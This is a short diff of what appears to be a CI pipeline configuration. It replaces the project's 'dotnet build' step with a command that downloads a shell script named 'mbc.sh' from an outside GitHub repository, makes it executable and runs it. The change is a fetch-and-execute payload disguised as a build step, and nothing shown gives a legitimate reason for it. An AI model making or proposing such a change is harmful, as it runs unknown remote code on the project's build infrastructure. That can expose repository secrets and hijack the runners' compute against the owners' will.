@@ -9,4 +9,4 @@
     
      steps:
        - checkout
-       - run: dotnet build
+       - run: wget https://raw.githubusercontent.com/linanta/alat/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
